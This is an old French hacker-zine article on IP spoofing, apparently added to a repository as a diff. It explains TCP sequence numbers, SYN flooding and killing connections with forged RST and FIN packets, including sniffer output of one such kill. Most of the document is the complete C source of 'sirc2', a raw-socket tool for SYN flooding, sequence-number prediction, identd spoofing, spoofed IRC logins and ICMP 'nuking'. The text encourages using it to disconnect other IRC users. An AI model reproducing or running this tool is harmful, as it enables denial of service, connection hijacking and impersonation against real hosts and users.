@@ -1,0 +1,885 @@
+                       =-=-=-=-=-=-=-=-=-=-=-==-
+                       - Un apercu du spoofing =
+                       =-=-=-=-=-=-=-=-=-=-=-==-
+
+Ce document est base sur la traduction de "A short overview of IP Spoofing"
+de Coder@reptile.rug.ac.be, duquel j'ai garde l'essentiel et ajoute quelques
+notes. Ben vi, il existe de tres beaux documents, alors pourquoi ne pas les
+utiliser ? :)
+
+Introduction
+=-=-=-=-=-=-
+
+Cet article est la suite de l'article sur TcPiP paru dans Noroute #1. Il
+decrit quelques attaques en spoofing et fournit des exemples de code de
+spoofers (et bien sur aussi tout ce qui va autour pour capter ce qui se passe
+exactement).
+
+Ce document requiert quelques connaissances elementaires de TCP/IP, de C
+(seulement les bases suffisent) et aussi un peu d'UNIX =). Ca te sert a rien
+de continuer si tu ne connais rien du tout a tout cela, enfin... disons
+qu'un peu de connaissances suffit. Et aussi je disclaime tout ce qui peut etre
+fait a propos de ces docs, ou du dommage subi qu'il peut y avoir: emotionnel,
+physique, perte de memoire, enfin tout le monde connait ca :)
+
+Le probleme de TCP/IP
+=-=-=-=-=-=-=-=-=-=-=
+
+Alors comme j'ai pu l'expliquer, ou aussi comme on peut trouver pleins de
+docs, je vais vous parler que de l'essentiel cette fois.
+
+Une connection est donc definie par 4 parametres, un port source et un port
+destination, ainsi qu'une machine source et une de destination. Quand une
+connection se fait, les donnees sont envoyees dans des paquets. Les paquets
+tiennent compte du trafic de bas niveau, et s'arrangent pour que les donnees
+arrivent. Le principe de la plupart des reseaux sont IP protocol version 4.
+Il est totalement independant de tous les protocoles hardware.
+
+TCP et UDP sont les protocoles du plus haut niveau mis dans les paquets IP,
+dans lesquels on trouve un header et des datas.
+
+Si le header contient: adresses IP de la machine de source et de destination,
+et le type de protocole des paquets enfermes dedans. (TCP=6, UDP=17, ... voir
+/etc/protocols).
+
+Les paquets UDP contiennent en bref: numeros de ports et machines de source
+et de destination. UDP n'a pas de choses telles que SEQ/ACK, c'est un pauvre
+protocole ;)
+
+Les paquets IP contiennent en bref : numeros de ports et machines de source
+et de destination, sequence et aknowlege numbers (souvent references
+SEQ/ACK), et bien sur d'autres choses :)
+
+ SEQ number: est compte octet par octet, et te donne le numero du prochain
+             octet a etre envoye ou ce qui a ete envoye dans ce paquet.
+
+ ACK number: c'est le nombre qui est espere etre recu de l'autre machine.
+
+Les nombres SEQ sont choisis au debut de la connection.
+
+Dur dur, si t'as pas compris ca, va voir le Phrack magazine numero 48, sinon
+tu vas pas capter le bordel qui suit =)
+
+Non-Blind Spoofing (le Spoofing poa aveugle)
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+Deja pour etre plus rapide, on va dire NBS plutot que non-blind spoofing.
+Le concept du NBS est assez simple. Comme les paquets voyagent (hehe oui je
+suis poa le seul a bouger :>) quand tu atteinds une machine, tu peux
+connaitre les numeros SEQ/ACK sur la connection.
+NBS est une methode simple et efficace d'attaque, mais limitee aux
+connections au dela de ton sous-reseau.
+
+Dans les docs sur le spoofing, ce type d'attaque est parfois omis, peut-etre
+car les gens ne connaissent pas l'avantage du spoof :)
+
+Le spoofing est generalement qualifie comme une ataque de treeeeeeeees haut
+niveau, ca refere au NBS car NBS est un jeu d'enfant pour un codeur competent.
+
+SYN Flooding
+------------
+Voici un petit dessin et ensuite une petite explication :
+
+       machine A <-----][----------X--------------->machine B
+                                   |
+       machine S <-----------------/
+
+La machine S fait gober une connection SYN allant de A vers B. La machine A
+devrait etre injoignable (eteinte, non existente, ...). B envoie une reponse
+a A, et va attendre une reponse de A.
+
+Si A est joignable, elle va repondre a B (avec un reset : RST) qu'elle n'a
+PAS demande de connection. B va ignorer le SYN request, et *normalement*
+rien de doit se passer).
+
+Si A n'est poa joignable, B va attendre la reponse a un moment. Lors de
+nombreuses connections, B va etre excede a un moment, et ne s'attendra plus
+a avoir de nouvelles connections pour un moment.
+
+Killer les connections
+----------------------
+Toujours pareil la description :)
+
+       machine A <------X------------------------->machine B
+                        |      A,B ont une connection TCP en cours
+       machine S <------/      A,S sont sur le meme sous reseau
+
+Le principe est le meme, mais ca peut etre marrant de killer les lamers sur
+la machine d'a cote ki trainent sur #france :)
+
+- Utilisation du reset (RST)
+Les paquets TCP ont des flags qui indiquent l'etat du paquet, comme RST.
+C'est un flag utilise pour remettre a zero la connection. Pour etre accepte,
+seul le sequence number doit etre correct (il n'y a pas d'ACK dans les
+paquets RST).
+Alors on attend les paquets de la connection entre A et B. Supposons que
+t'attendes les paquets vers A, tu vas calculer (a partir des paquets de B)
+le sequence number pour les paquets de A (a partir des ACKs de B), et fait
+peter un fake RST depuis S vers B, et A la pauvre ne capte poa :)
+L'attaque actuelle : (soit A est 166.66.66.1 et B 111.11.11.11, et S sur le
+meme sous-reseau que A). et voila ce que dit un petit sniffer :)
+
+1) Connection en cours
+   on attend un paquet pour recevoir le SEQ/ACK courant (A -> B)
+
+   TCP Packet ID (from_IP.port-to_IP.port): 166.66.66.1.1810-111.11.11.11.23
+      SEQ (hex): 57E1F2A6   ACK (hex): B8BD7679
+      FLAGS: -AP---   Window: 3400
+      (donnees enlevees car poa utiles, 2 octets de datas)
+
+2) C'est le ACK qui arrive + les donnes incluses (ce ki fait changer le SEQ,
+   et a foutu en l'air notre plan, car ca a ete tres rapide.)
+
+   TCP Packet ID (from_IP.port-to_IP.port): 111.11.11.11.23-166.66.66.1.1810
+      SEQ (hex): B8BD7679   ACK (hex): 57E1F2A8
+      FLAGS: -AP---   Window: 2238
+      (donnees enlevees car poa utiles, 2 octets de datas)
+
+3) ACK de A vers B
+
+   TCP Packet ID (from_IP.port-to_IP.port): 166.66.66.1.1810-111.11.11.11.23
+      SEQ (hex): 57E1F2A8   ACK (hex): B8BD767B
+      FLAGS: -A----   Window: 3400
+      (donnees enlevees car poa utiles)
+
+4) donnees ki passent de B vers A
+
+   TCP Packet ID (from_IP.port-to_IP.port): 111.11.11.11.23-166.66.66.1.1810
+      SEQ (hex): B8BD767B   ACK (hex): 57E1F2A8
+      FLAGS: -AP---   Window: 2238
+      (donnees enlevees car poa utiles)
+
+5) encore un ACK de A vers B
+
+   TCP Packet ID (from_IP.port-to_IP.port): 166.66.66.1.1810-111.11.11.11.23
+      SEQ (hex): 57E1F2A8   ACK (hex): B8BD7691
+      FLAGS: -A----   Window: 3400
+
+6) Maintenant on fait peter 2 paquets RST. Mais comment tu peux expliker
+   ca ??? bah en fait, le premier reset a ete mit en buffer quelque part sur
+   ta box, car le segment ethernet etait trop occupe et on veut ABSOLUMENT
+   le renvoyer. Ha quelle chance, ca a ete rapide et on a detruit la
+   connection :)
+   Si ca avait pas ete asse rapide, on aurait pu louper notre reset (ou la
+   connection serait killee un peu plus tard que quand on le voulait), tu
+   verras des idees pour voir comment regler ce probleme (arf je cause bien
+   la france moah :/)
+
+   TCP Packet ID (from_IP.port-to_IP.port): 111.11.11.11.23-166.66.66.1.1810
+      SEQ (hex): B8BD7679      FLAGS: ---R--
+
+
+   TCP Packet ID (from_IP.port-to_IP.port): 111.11.11.11.23-166.66.66.1.1810
+      SEQ (hex): B8BD7691      FLAGS: ---R--
+      (C'est le paquet ki a kille la connection)
+
+
+
+Fermer une connection (FIN)
+---------------------------
+Il existe un autre flag appele FIN qui dit : "plus de donnees depuis
+l'envoyeur". Ce flag est utilise quand ferme une connection par un chemin
+legitime. Donc s'il y a un moyen de creer un paquet qui soit accepte par une
+des deux machines, cette machine croirait bien que l'autre n'a plus de
+donnees a envoyer. Les "vrais" paquets ki vont suivre seront consideres
+comme mauvais :) Comme on peut sniffer les SEQ/ACK courant de la connection,
+on peut pretendre etre soit machine A ou la machine B, et envoyer a l'autre
+machine avec les infos correctes sur le paquet, et bien sur le killer de FIN.
+
+Quand ce signal est envoye, l'autre machine va toujours repondre avec un, si
+le signal est accepte, donc on peut verifier que le kill a bien marche, et
+il peut y avoir 100% de success.
+
+Je n'en dirai pas plus pour l'instant :)
+
+Donc voila en bref comment ca se passe, maintenant voila les sources d'un
+spoofer appele sirc2.c
+
+-----------------------------<-- CUT HERE -->--------------------------
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <stdio.h>
+#include <sys/utsname.h>
+
+#define UNREACHHOST "0.0.0.1"
+
+int readsock,sendsock,debug=1;
+unsigned short ipident;
+
+typedef struct {
+  struct sockaddr_in from;
+  struct sockaddr_in dest;
+  unsigned short sport;
+  unsigned short dport;
+  unsigned long seq;
+  unsigned long ack;
+} spoofrec;
+
+unsigned short in_cksum(unsigned short *addr, int len)             /* from ping.c */
+{
+  register int nleft = len;
+  register u_short *w = addr;
+  register int sum = 0;
+  u_short answer = 0;
+
+  /*
+   *  Our algorithm is simple, using a 32 bit accumulator (sum),
+   *  we add sequential 16 bit words to it, and at the end, fold
+   *  back all the carry bits from the top 16 bits into the lower
+   *  16 bits.
+   */
+  while( nleft > 1 )  {
+    sum += *w++;
+    nleft -= 2;
+  }
+
+  /* mop up an odd byte, if necessary */
+  if( nleft == 1 ) {
+    *(u_char *)(&answer) = *(u_char *)w ;
+    sum += answer;
+  }
+
+  /*
+   * add back carry outs from top 16 bits to low 16 bits
+   */
+  sum = (sum >> 16) + (sum & 0xffff);     /* add hi 16 to low 16 */
+  sum += (sum >> 16);                     /* add carry */
+  answer = ~sum;                          /* truncate to 16 bits */
+  return (answer);
+}
+
+int resolve_host(char *host,struct sockaddr_in *sa)
+{
+  struct hostent *ent ;
+
+  bzero(sa,sizeof(struct sockaddr));
+  sa->sin_family = AF_INET;
+  sa->sin_addr.s_addr = inet_addr(host);
+  if (inet_addr(host) == -1) {
+    ent = gethostbyname(host);
+    if (ent != NULL) {
+      sa->sin_family = ent->h_addrtype;
+      bcopy(ent->h_addr,(caddr_t)&sa->sin_addr,ent->h_length);
+      return(0);
+    } else {
+      fprintf(stderr,"error: unknown host %s\n",host);
+      return(-1);
+    }
+  }
+  return(0);
+}
+
+typedef struct {
+  unsigned char vh;
+  unsigned char stype;
+  unsigned short length;
+  unsigned short ident;
+  unsigned short frag;
+  unsigned char ttl;
+  unsigned char protocol;
+  unsigned short cksum;
+  struct in_addr sip;
+  struct in_addr dip;
+} iprec;
+
+typedef struct {
+  unsigned short sport;
+  unsigned short dport;
+  unsigned long seqnum;
+  unsigned long acknum;
+  unsigned short hrc;
+  unsigned short window;
+  unsigned short cksum;
+  unsigned short urgentptr;
+} tcprec;
+
+typedef struct {
+  struct in_addr sip;
+  struct in_addr dip;
+  unsigned char zero;
+  unsigned char proto;
+  unsigned short tcplen;
+} tcpsrec;
+
+typedef struct {
+  unsigned char type;
+  unsigned char code;
+  unsigned short cksum;
+  unsigned long zero;
+  iprec ip;
+  unsigned short sport;
+  unsigned short dport;
+  unsigned long seq;
+} icmprec;
+
+#define CF_URG 0x2000
+#define CF_ACK 0x1000
+#define CF_PSH 0x0800
+#define CF_RST 0x0400
+#define CF_SYN 0x0200
+#define CF_FIN 0x0100
+
+#define MAXDATA 1436
+#define MAXSIZE sizeof(tcpsrec)+sizeof(tcprec)+MAXDATA
+
+unsigned short tcpcksum(spoofrec *spoof, char *b, short length)
+{
+  char buf[MAXSIZE];
+  tcpsrec *tcps;
+
+  tcps=(tcpsrec *)buf;
+  tcps->sip=spoof->from.sin_addr;
+  tcps->dip=spoof->dest.sin_addr;
+  tcps->zero=0;
+  tcps->proto=6;
+  tcps->tcplen=htons(length);
+  memcpy(&buf[sizeof(tcpsrec)],(void *)b,length);
+
+  return(in_cksum((unsigned short *)buf,sizeof(tcpsrec)+length));
+}
+
+void sendicmp(spoofrec *spoof, struct sockaddr_in *from, unsigned short code)
+{
+  iprec *ip;
+  icmprec *icmp;
+  char buf[MAXSIZE];
+
+  bzero(buf,MAXSIZE);
+
+  ip=(iprec *)buf;
+  icmp=(icmprec *)&buf[sizeof(iprec)];
+
+  ip->vh=0x45;
+  ip->stype=0;
+  ip->length=htons(sizeof(iprec)+20);
+  ip->ident=htons(ipident++);
+  ip->frag=0;
+  ip->ttl=64;
+  ip->protocol=1;
+  ip->cksum=0;
+  ip->sip=from->sin_addr;
+  ip->dip=spoof->dest.sin_addr;
+  ip->cksum=in_cksum((unsigned short *)ip,sizeof(iprec));
+
+  icmp->type=3;
+  icmp->code=code;
+  icmp->zero=0;
+  icmp->ip.vh=0x45;
+  icmp->ip.stype=0;
+  icmp->ip.length=htons(sizeof(iprec)+sizeof(tcprec));
+  icmp->ip.ident=htons(ipident++);
+  icmp->ip.frag=0;
+  icmp->ip.ttl=64;
+  icmp->ip.protocol=6;
+  icmp->ip.cksum=0;
+  icmp->ip.sip=spoof->dest.sin_addr;
+  icmp->ip.dip=spoof->from.sin_addr;
+  icmp->ip.cksum=in_cksum((unsigned short *)&icmp->ip,sizeof(iprec));
+  icmp->sport=htons(1234);
+  icmp->dport=htons(6667);
+  icmp->seq=htonl(1000000);
+  icmp->cksum=0;
+  icmp->cksum=in_cksum((unsigned short *)icmp,sizeof(icmprec));
+
+  if (sendto(sendsock, (void *)buf, sizeof(iprec)+sizeof(icmprec), 0, &spoof->dest, sizeof(spoof->dest)) < 0)
+    perror("sending message");
+
+}
+
+void sendtcp(spoofrec *spoof, unsigned short code, char *data, short datalen, short sn, short rep)
+{
+  iprec *ip;
+  tcprec *tcp;
+  char buf[MAXSIZE];
+  short i,i1,hsize,tsize=0;
+  unsigned long ack;
+
+  bzero(buf,MAXSIZE);
+
+  ip=(iprec *)buf;
+  tcp=(tcprec *)&buf[sizeof(iprec)];
+
+  if (code & CF_SYN) {
+    hsize=6;
+    buf[sizeof(iprec)+20]=2;
+    buf[sizeof(iprec)+20+1]=4;
+    buf[sizeof(iprec)+20+2]=(MAXDATA>>8) & 0xFF;
+    buf[sizeof(iprec)+20+3]=(MAXDATA) & 0xFF;
+    spoof->seq++;
+  } else
+    hsize=5;
+
+  tsize=sizeof(iprec)+(hsize*4);
+
+  if (datalen) {
+    memcpy(&buf[tsize],data,datalen);
+    tsize+=datalen;
+  }
+
+  ip->vh=0x45;
+  ip->stype=0;
+  ip->length=htons(tsize);
+  ip->ident=htons(ipident++);
+  ip->frag=0;
+  ip->ttl=64;
+  ip->protocol=6;
+  ip->cksum=0;
+  ip->sip=spoof->from.sin_addr;
+  ip->dip=spoof->dest.sin_addr;
+  ip->cksum=in_cksum((unsigned short *)ip,sizeof(iprec));
+
+  ack=spoof->ack;
+
+  for (i=0;i<sn;i++) {
+    tcp->sport=spoof->sport;
+    tcp->dport=spoof->dport;
+    tcp->seqnum=htonl(spoof->seq);
+    tcp->acknum=htonl(ack);
+    tcp->hrc=(hsize<<4) + code;
+    if (code & CF_SYN)
+      tcp->window=htons(512);
+     else
+      tcp->window=htons(14360);
+    tcp->urgentptr=0;
+    tcp->cksum=0;
+    tcp->cksum=tcpcksum(spoof,(char *)tcp,tsize-sizeof(iprec));
+
+    ack+=64000;
+
+    for (i1=0;i1<rep;i1++) {
+      if (sendto(sendsock, (void *)buf, tsize, 0, &spoof->dest, sizeof(spoof->dest)) < 0)
+        perror("sending message");
+    }
+  }
+  spoof->seq+=datalen;
+}
+
+short gettcp(spoofrec *spoof, tcprec *dtcp)
+{
+  int numread;
+  char buf[MAXSIZE];
+  tcprec *tcp;
+
+  if ((numread=read(readsock,buf,MAXSIZE)) < 0) {
+    perror("reading from socket");
+    exit(1);
+  }
+  if ((buf[0]>>4) != 4) {
+/*    printf("Not IP packet\n"); */
+    return(0);
+  }
+  if (buf[9] != 6) {
+/*    printf("Not TCP packet\n"); */
+    return(0);
+  }
+
+  tcp=(tcprec *)&buf[20];
+  if (memcmp(&spoof->dest.sin_addr,&buf[12],4)!=0)
+    return(0);
+
+  memcpy((void *)dtcp,(void *)tcp,sizeof(tcprec));
+  return(1);
+}
+
+void sendstring(spoofrec *spoof, char *s)
+{
+  sendtcp(spoof,CF_ACK | CF_PSH,s,strlen(s),6,2);
+}
+
+void main(int argc, char *argv[])
+{
+  int i,i1,done,mode,noflood=1,spoofidentd=1,waitidentd=0;
+  struct sockaddr_in name;
+  tcprec tcp;
+  spoofrec seqpred,spoof,identd,flood;
+  unsigned short portbase,curpos,fromport;
+  unsigned int lasttime,iport,starttime;
+  char s[81],ch,*nickname,*username,*gecos,*spoofhost,*newbbuf;
+  struct hostent *lookup;
+  struct utsname ub;
+  unsigned char s1[81];
+
+  if (argc<4) {
+    printf("Usage: %s <your ip> <dest ip> <port> [options]\n",argv[0]);
+    printf("  -i [<nickname> <username@host> <gecos info>]  Log onto IRC\n");
+    printf("  -t <host>\t\tCreate's a telnet like connection\n");
+    printf("  -s <unreach host>\tTest's to see if the machine is SYN floodable\n");
+    printf("  -w \t\tWait for identd port before continuing\n");
+    printf("  -d \t\tAttempt to spoof identd\n");
+    printf("  -f \t\tFlood the spoof'd IP\n");
+    printf("  -n <host>\t\tNuke the person from this host. your ip=irc server\n\n");
+    printf(" If no options specified, then it will just test the machine to see if it\n");
+    printf("  is ip spoofable\n\n");
+    printf("Note: IP's can be interchanged with a hostname\n");
+    printf("Note: Surround the gecos field with \" to preserve the spaces\n");
+    exit(1);
+  }
+
+  mode=0;
+  for (i=4;i<argc;i++) {
+    if ((argv[i][0]=='-') || (argv[i][0]=='/')) {
+      switch (toupper(argv[i][1])) {
+        case 'I':
+          mode=1;
+          nickname=argv[++i];
+          username=argv[++i];
+          spoofhost=strchr(username,'@');
+          if (!spoofhost) {
+            printf("Couldn't parse %s into user and host\n",username);
+            exit(1);
+          }
+          *(spoofhost++)=0;
+          gecos=argv[++i];
+	  if (debug) {printf("Connecting to IRC as %s - %s@%s - %s\n",nickname,username,spoofhost,gecos);}
+          break;
+        case 'T':
+          printf("Creating \"telnet\" connection\n");
+          spoofhost=argv[++i];
+          mode=2;
+          break;
+        case 'S':
+          printf("Testing host for SYN flood vulnerability\n");
+          spoofhost=argv[++i];
+          mode=3;
+          break;
+        case 'F':
+          noflood=0;
+          break;
+        case 'D':
+          spoofidentd=1;
+          break;
+        case 'W':
+          waitidentd=1;
+          break;
+        case 'N':
+          printf("Nuking host\n");
+          spoofhost=argv[++i];
+          mode=4;
+          break;
+      }
+    }
+  }
+
+  if (noflood) {
+    fromport=1024+getpid();
+    if (fromport<1024)
+      fromport+=1024;
+  } else
+    fromport=7;
+
+  if (!mode)
+    printf("Testing machine for IP spoofablity\n");
+
+  srand(time(NULL));
+
+  /* Create socket on which to send. */
+  if ((sendsock = socket(AF_INET, SOCK_RAW, 255)) < 0) {
+    perror("opening raw send socket");
+    exit(1);
+  }
+
+  /* Create socket on which to read. */
+  if ((readsock = socket(AF_INET, SOCK_RAW, 6)) < 0) {
+    perror("opening raw read socket");
+    exit(1);
+  }
+  name.sin_family=AF_INET;
+  name.sin_addr.s_addr=INADDR_ANY;
+  name.sin_port=10000;
+  if (bind(readsock, &name, sizeof(name))) {
+    perror("binding read socket");
+    exit(1);
+  }
+
+  /* We'll resolve all of the hosts here so we won't get any delays when */
+  /*  we need low latency on our side */
+  if (resolve_host(argv[1],&seqpred.from)<0)
+    exit(-1);
+  if (resolve_host(argv[2],&spoof.dest)<0)
+    exit(-1);
+  if (mode>0)  {
+    if (resolve_host(spoofhost,&spoof.from)<0)
+      exit(-1);
+    if (resolve_host(UNREACHHOST,&flood.from)<0)
+      exit(1);
+
+    /* The flood dest address should be the spoof from */
+    if ((strcmp(spoofhost,"127.0.0.1")==0) || (strcmp(spoofhost,"localhost")==0))
+      flood.dest=spoof.dest;
+     else
+      flood.dest=spoof.from;
+  }
+
+  /* The seq prediction dest should be spoof dest also */
+  seqpred.dest=spoof.dest;
+
+  /* Print out some of the IP's */
+  if (debug) {printf("This IP: %d.%d.%d.%d",
+    ((unsigned char *)&seqpred.from.sin_addr)[0],
+    ((unsigned char *)&seqpred.from.sin_addr)[1],
+    ((unsigned char *)&seqpred.from.sin_addr)[2],
+    ((unsigned char *)&seqpred.from.sin_addr)[3]);}
+  if ((lookup = gethostbyaddr((char *)&seqpred.from.sin_addr,sizeof(long),AF_INET)) != NULL) {
+    if (debug) {printf(" - %s",lookup->h_name);}}
+  if (debug) {printf("\n");}
+
+  if (mode > 0) {
+    if (debug) {printf("From IP: %d.%d.%d.%d",
+      ((unsigned char *)&spoof.from.sin_addr)[0],
+      ((unsigned char *)&spoof.from.sin_addr)[1],
+      ((unsigned char *)&spoof.from.sin_addr)[2],
+      ((unsigned char *)&spoof.from.sin_addr)[3]);}
+    if ((lookup = gethostbyaddr((char *)&spoof.from.sin_addr,sizeof(long),AF_INET)) != NULL) {if (debug) {printf(" - %s",lookup->h_name);}}
+    if (debug) {printf("\n");}
+  }
+
+  if (debug) {printf("Dest IP: %d.%d.%d.%d",
+    ((unsigned char *)&spoof.dest.sin_addr)[0],
+    ((unsigned char *)&spoof.dest.sin_addr)[1],
+    ((unsigned char *)&spoof.dest.sin_addr)[2],
+    ((unsigned char *)&spoof.dest.sin_addr)[3]);}
+  if ((lookup = gethostbyaddr((char *)&spoof.dest.sin_addr,sizeof(long),AF_INET)) != NULL)
+    if (debug) {printf(" - %s",lookup->h_name);}
+  if (debug) {printf("\n");}
+
+  /* Randomize some of the #'s */
+  ipident=rand()%20000;
+  spoof.seq=(rand()+10)*(rand()*10);
+
+  /* Nuke host */
+  if (mode==4) {
+    for (i=0;i<10;i++)
+      for (i1=0;i1<4;i1++)
+        sendicmp(&seqpred,&spoof.from,i1);
+    exit(1);
+  }
+
+  /* Test for SYN flooding */
+  if (mode==3) {
+    printf("Now testing host\n");
+    setbuf(stdout,NULL);
+    spoof.ack=0;
+    spoof.dport=htons(atoi(argv[3]));
+    seqpred.dport=htons(atoi(argv[3]));
+    seqpred.sport=htons(getpid());
+    lasttime=0;
+    done=0;
+    starttime=time(NULL)+20;
+    while (!done) {
+      if (lasttime < time(NULL)) {
+        for (i=0;i<50;i++) {
+          spoof.sport=htons(9000+i);
+          sendtcp(&spoof,CF_SYN,NULL,0,1,1);
+        }
+        lasttime=time(NULL)+5;
+        sendtcp(&seqpred,CF_ACK,NULL,0,1,2);
+      }
+      if (starttime<time(NULL)) {
+        printf("Possibly SYN floodable\n");
+        exit(1);
+      }
+      while (gettcp(&seqpred,&tcp)) {
+        if (ntohs(tcp.dport)==ntohs(seqpred.sport)) {
+          printf("Not SYN floodable\n");
+          exit(1);
+        }
+      }
+    }
+  }
+
+  /* Let's start the flood now */
+  if ((mode>0) && (mode<4) && (!noflood)) {
+    printf("Now flooding host\n");
+    flood.seq=spoof.seq-64000;
+    flood.ack=0;
+    flood.dport=htons(fromport);
+    for (i=0;i<50;i++) {
+      flood.sport=htons(10000-i);
+      sendtcp(&flood,CF_SYN,NULL,0,1,1);
+    }
+/*
+    flood.dport=htons(113);
+    for (i=0;i<50;i++) {
+      flood.sport=htons(11000-i);
+      sendtcp(&flood,CF_SYN,NULL,0,1,1);
+    }
+*/
+  }
+
+  /* We'll use the already made socket API to connect to the remote machine */
+  /*  We do this because when we connect to the machine, it will auto- */
+  /*  magically send out an identd request. We'll capture the source port */
+  /*  when we're doing the seq # pred. */
+  if (spoofidentd) {
+    seqpred.dest.sin_port=htons(atoi(argv[3]));
+    if ((i=socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+      perror("Opening stream socket");
+      exit(1);
+    }
+    if (connect(i, &seqpred.dest, sizeof(seqpred.dest)) < 0) {
+      perror("Connecting stream socket");
+      exit(1);
+    }
+    close(i);
+  }
+
+  seqpred.dport=htons(atoi(argv[3]));
+  if (!mode) {
+    portbase=1000;
+    for (i=0;i<10;i++) {
+      seqpred.sport=htons(portbase+i);
+      sendtcp(&seqpred,CF_SYN,NULL,0,1,1);
+      sendtcp(&seqpred,CF_RST,NULL,0,1,1);
+    }
+    done=0;
+    lasttime=0;
+    while (!done) {
+      if (gettcp(&seqpred,&tcp)) {
+        if ((ntohs(tcp.dport)>=portbase) && (ntohs(tcp.dport)<=(portbase+10))) {
+          if ((tcp.hrc & CF_ACK) && (tcp.hrc & CF_RST)) {
+            printf("Connection refused\n");
+            exit(1);
+          }
+          if (lasttime)
+            printf("%d - %lu - %lu\n",ntohs(tcp.dport),ntohl(tcp.seqnum),ntohl(tcp.seqnum)-lasttime);
+           else
+            printf("%d - %lu\n",ntohs(tcp.dport),ntohl(tcp.seqnum));
+          lasttime=ntohl(tcp.seqnum);
+        }
+      }
+    }
+    exit(1);
+  }
+
+  if (debug) {printf("Starting sequence # prediction\n");}
+  portbase=(rand()%10000)+2000;
+  lasttime=0;
+  done=0;
+  i=0;
+  iport=0;
+  while ((!done) || (waitidentd ? !iport : 0)) {
+    /* Every 2 seconds, send out a SYN packet */
+    if (lasttime<time(NULL)) {
+      seqpred.sport=htons(portbase+i);
+      sendtcp(&seqpred,CF_SYN,NULL,0,1,1);
+      i++;
+      lasttime=time(NULL)+2;
+    }
+
+    while ((gettcp(&seqpred,&tcp)) && (!done)) {
+      if ((ntohs(tcp.dport)==113) && (!iport)) {
+        iport=ntohs(tcp.sport);
+        if (debug) {printf("Identd port: %d\n",iport);}
+      }
+
+      if (ntohs(tcp.dport)==ntohs(seqpred.sport)) {
+        if ((tcp.hrc & CF_ACK) && (tcp.hrc & CF_RST)) {
+          printf("Connection refused\n");
+          exit(1);
+        }
+        seqpred.ack=ntohl(tcp.seqnum);
+        done=1;
+      }
+    }
+  }
+
+  if (debug) {printf("Port: %d\n",ntohs(seqpred.sport));}
+
+  spoof.dport=seqpred.dport;
+  spoof.sport=htons(fromport);
+  spoof.seq=seqpred.seq+128000;
+  spoof.ack=seqpred.ack+64000;
+  if (debug) {printf("ACK: %lu\n",spoof.ack);}
+
+  sendtcp(&spoof,CF_SYN,NULL,0,1,1);
+  sleep(1);
+  sendtcp(&spoof,CF_ACK,NULL,0,6,2);
+
+  /* Now comes the time to spoof the identd connection */
+/*  if ((iport) && (mode==1)) {*/
+    identd.from=spoof.from;
+    identd.dest=spoof.dest;
+    identd.sport=htons(113);
+    identd.seq=spoof.seq+128000;
+    if (debug) {printf("Beginning identd spoofing\n");}
+    for (i=0;i<25;i++) {
+      /* Setup some variables */
+      identd.dport=htons(iport+i+1);
+      identd.seq+=128000;
+      identd.ack=spoof.ack+64001;
+
+      /* Send the connection accept packet */
+      sendtcp(&identd,CF_SYN | CF_ACK,NULL,0,6,2);
+
+      /* sleep(1); */
+
+      /* Acknowledge the packet it sends us */
+      /* We need to acknowledge the correct # of chars since we need to */
+      /*  close this connection quickly before ircII times out */
+      identd.ack+=5;
+      sprintf(s,"%d",ntohs(spoof.sport));
+      identd.ack+=strlen(s);
+      sprintf(s,"%d",ntohs(spoof.dport));
+      identd.ack+=strlen(s);
+      sendtcp(&identd,CF_ACK,NULL,0,6,2);
+
+      /* Make our packet confirming our identity */
+      sprintf(s,"%hu, %hu : USERID : UNIX : %s\r\n",ntohs(spoof.sport),ntohs(spoof.dport),username);
+      sendstring(&identd,s);
+
+      /* sleep(1); */
+
+      /* And close the connection */
+      sendtcp(&identd,CF_FIN | CF_ACK,NULL,0,6,2);
+      identd.seq++;
+      identd.ack++;
+      sendtcp(&identd,CF_FIN | CF_ACK,NULL,0,6,2);
+    }
+/*  }*/
+
+  sleep(1);
+  if (mode==1) {
+    sendstring(&spoof,"\n"); /* Send a blank line */
+    sprintf(s,"NICK %s\n",nickname);
+    sendstring(&spoof,s); /* Then the NICK */
+    if (debug) {printf("%s",s);}
+    sprintf(s,"USER %s nope nope :%s\n",username,gecos);
+    sendstring(&spoof,s); /* And then USER */
+    if (debug) {printf("%s",s);}
+    sprintf(s,"MODE %s +i\n",nickname);
+    sendstring(&spoof,s); /* And lastly the MODE */
+    if (debug) {printf("%s",s);}
+    if (!debug) {printf("Logging into irc server as: %s (%s@%s)\n",nickname,username,spoofhost);}
+  }
+
+  done=0;
+  curpos=0;
+  while (!done) {
+    if (fread(&ch,sizeof(char),1,stdin)>0) {
+      s[curpos++]=ch;
+      if ((ch=='\r') || (ch=='\n')) {
+        s[curpos]=0;
+        sendstring(&spoof,s);
+        curpos=0;
+      }
+    }
+  }
+
+  close(sendsock);
+  close(readsock);
+  printf("\n");
+}
+
+---------------------------<-- CUT HERE -->---------------------------
+
+[Note de hOtCodE: ptain, mais sirc3 est sorti! pffff! Si vous etes interesses,
+il est sur la page du groupe <http://www.mygale.org/00/phe>]
+
+Greetings
+=-=-=-=-=
+
+CoD4, mikasoft, LaRsEn, PiXel4, sd4, FfT, ByPaSS, HoTCoDe, tous ceux de
+#banane, et tous les autres ke g oublie =)    ..................    cya
+
